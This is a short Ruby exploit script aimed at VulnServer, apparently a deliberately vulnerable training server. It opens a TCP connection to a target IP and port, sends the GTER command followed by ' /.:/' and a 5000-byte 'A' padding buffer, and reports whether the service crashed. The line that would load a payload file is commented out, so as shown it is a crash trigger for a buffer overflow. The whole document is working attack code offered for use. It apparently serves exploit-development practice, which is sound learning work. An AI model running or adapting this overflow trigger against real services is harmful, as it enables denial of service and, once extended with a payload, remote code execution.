#! /usr/bin/env ruby
# VulnServer.exe Exploit
# 
# Usage ./vulnserv.rb <IP> <PORT> <PAYLOAD FILE>
#
require 'socket'

# Check arguments
if ARGV.length < 3
  puts "usage #{__FILE__} <target ip> <target port> <payload file>"
  exit
end

# Create the socket
IP=ARGV[0]
PORT=ARGV[1]
FILE = ARGV[2]

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "GTER"

# Define payload
payload = " /.:/"
#payload += File.read(FILE)
payload += "A" * 5000  # Padding

# Send the payload
begin
  s.gets
  puts "[+] Sending payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

